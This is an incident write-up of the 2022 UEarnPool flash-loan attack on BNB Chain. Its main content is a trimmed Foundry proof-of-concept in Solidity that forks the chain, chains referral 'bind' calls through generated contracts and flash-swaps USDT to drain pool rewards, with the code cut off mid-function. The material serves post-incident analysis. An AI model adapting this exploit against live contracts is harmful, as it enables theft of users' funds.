# [?] - UEarnPool - FlashLoan Attack

## Summary
Severity: Unknown
Chain: BNB Chain
Component: UEarnPool
Published: 2022-11-17
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-11/UEarnPool_exp.sol
Type: defi-exploit-poc

## Details
Lost: $24k
References:
- https://twitter.com/CertiKAlert/status/1593094922160128000
- https://bscscan.com/tx/0xb83f9165952697f27b1c7f932bcece5dfa6f0d2f9f3c3be2bb325815bfd834ec
- https://bscscan.com/tx/0x824de0989f2ce3230866cb61d588153e5312151aebb1e905ad775864885cd418

```solidity
contract ContractTest is Test {
    UEarnPool Pool = UEarnPool(0x02D841B976298DCd37ed6cC59f75D9Dd39A3690c);
    Uni_Pair_V2 Pair = Uni_Pair_V2(0x7EFaEf62fDdCCa950418312c6C91Aef321375A00);
    IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    address[] contractList;

    CheatCodes constant cheat = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheat.createSelectFork("bsc", 23_120_167);
    }

    function testExploit() public {
        contractFactory();
        // bind invitor
        (bool success,) = contractList[0].call(abi.encodeWithSignature("bind(address)", tx.origin));
        require(success);
        for (uint256 i = 1; i < 22; i++) {
            (bool success,) = contractList[i].call(abi.encodeWithSignature("bind(address)", contractList[i - 1]));
            require(success);
        }

        Pair.swap(2_420_000 * 1e18, 0, address(this), new bytes(1));

        emit log_named_decimal_uint("[End] Attacker USDT balance after exploit", USDT.balanceOf(address(this)), 18);
    }

    function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) public {
        uint256 len = contractList.length;
        // LevelConfig[3].teamAmount : 2_400_000
        USDT.transfer(contractList[len - 1], 2_400_000 * 1e18);
```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-11/UEarnPool_exp.sol_
